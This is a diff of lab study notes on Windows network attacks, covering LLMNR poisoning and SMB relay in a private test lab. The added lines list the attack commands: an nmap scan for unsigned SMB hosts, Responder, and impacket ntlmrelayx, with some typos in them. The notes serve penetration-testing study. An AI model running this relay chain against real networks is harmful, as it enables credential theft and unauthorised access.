@@ -1,6 +1,6 @@
 Setup win2022 server: 192.168.64.138   
 Setup Peterparker: 192.168.64.140  
-Setup Frankcastle: 192.168.64.139
+Setup Frankcastle: 192.168.64.139  
 Kali: 192.168.64.129/24
 
 ## LLMNR Poisoning - Link Local Multicast resolution  
@@ -48,15 +48,24 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
 * Target machine should be admin, domain admin or service accounts for maximum effect.
 * Responder config files /etc/responsder/Responder.conf must have smb and https turned off, so that captured hashes are not stored but are instead 'relayed'.
 
-[insert picture here]
+![image](https://github.com/user-attachments/assets/24c18c8f-2120-4dd1-84b1-d3d888702e53)
 
-1. Firstly identify hosts without SMB signing, 
+1. Firstly identify hosts without SMB signing. 
 
-      nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn 
+            nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn 
       
 ![image](https://github.com/user-attachments/assets/52f6904d-f256-467c-9b40-414b011f57c2)
 
 2. Once we have discovered our targets (have SMB signing disabled and not required). Create a targets.txt detailing the targets.
 
-      nano target.txt 
+            nano target.txt > add target ips into file
+
+3. Start responsder with the new edited config files.
+
+            responder -I eth0 dwPv
+
+5. Start ntlmrelayx.py or impacket-ntlmrelax
+
+            impacket-ntlmrelax -tf targets.txt -smb2support
+
 
